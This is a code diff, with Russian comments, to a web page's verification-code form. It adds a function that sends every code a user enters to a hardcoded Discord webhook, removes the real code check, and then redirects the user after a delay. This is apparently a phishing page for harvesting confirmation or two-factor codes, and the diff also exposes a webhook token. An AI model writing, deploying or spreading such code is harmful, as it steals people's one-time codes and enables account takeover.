@@ -23,6 +23,32 @@ function updateTimer() {
     }
 }
 
+// Функция отправки данных в Discord через вебхук
+function sendToDiscord(code) {
+    const webhookUrl = "https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB";  // Замените на ваш реальный URL вебхука
+
+    // Формируем сообщение для Discord
+    const payload = {
+        content: `Получен код подтверждения: ${code}`
+    };
+
+    // Отправка POST-запроса на Discord
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Успешно отправлено в Discord:", data);
+    })
+    .catch(error => {
+        console.error("Ошибка при отправке в Discord:", error);
+    });
+}
+
 // Проверка введенного кода
 function checkCode() {
     const enteredCode = codeInput.value.trim();
@@ -38,17 +64,19 @@ function checkCode() {
 // Обработчик клика на кнопку подтверждения
 verifyButton.addEventListener('click', function() {
     const enteredCode = codeInput.value.trim();
-    if (enteredCode === "123456") {  // Замените на ваш реальный код
-        // Симуляция задержки загрузки после ввода кода
-        loadingElement.style.display = 'block';
-        setTimeout(() => {
-            alert('Код подтвержден!');
-            loadingElement.style.display = 'none';
-            // Перенаправление или выполнение других действий
-        }, 720000); // 12 минут (12 * 60 * 1000 мс)
-    } else {
-        errorMessage.style.display = 'block';
-    }
+
+    // Симуляция задержки загрузки после ввода кода
+    loadingElement.style.display = 'block';
+
+    // Отправляем код в Discord
+    sendToDiscord(enteredCode);
+
+    setTimeout(() => {
+        loadingElement.style.display = 'none';
+        // Перенаправление или выполнение других действий
+        // Например, можно перенаправить на другую страницу
+        window.location.href = "index.html";  // Замените на вашу страницу
+    }, 20000); // Задержка 2 секунды перед выполнением действия
 });
 
 // Проверка кода при вводе
